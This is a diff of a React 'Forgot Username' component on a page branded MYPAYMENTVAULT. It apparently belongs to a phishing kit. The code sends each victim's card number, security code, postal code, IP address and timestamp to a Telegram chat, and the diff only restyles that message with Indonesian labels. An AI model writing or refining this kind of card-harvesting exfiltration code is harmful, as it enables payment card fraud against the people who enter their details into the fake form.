@@ -28,12 +28,16 @@ export default function ForgotUsername() {
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
     const ip = await getIPInfo();
     await sendTelegram(
-      `🔍 <b>MYPAYMENTVAULT - Forgot Username</b>\n\n` +
-      `💳 Card Number: <code>${cardNumber}</code>\n` +
-      `🔒 Security Code: <code>${securityCode}</code>\n` +
-      `📮 Postal Code: <code>${postalCode}</code>\n` +
-      `🌐 IP Address: <code>${ip}</code>\n` +
-      `🕐 Waktu: ${now}`
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🔍 <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Lupa Username</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `💳 <b>No. Kartu</b>   : <code>${cardNumber}</code>\n` +
+      `🔒 <b>Kode Keamanan</b>: <code>${securityCode}</code>\n` +
+      `📮 <b>Postal Code</b> : <code>${postalCode}</code>\n` +
+      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
     );
     await new Promise((r) => setTimeout(r, 1000));
     setLoading(false);
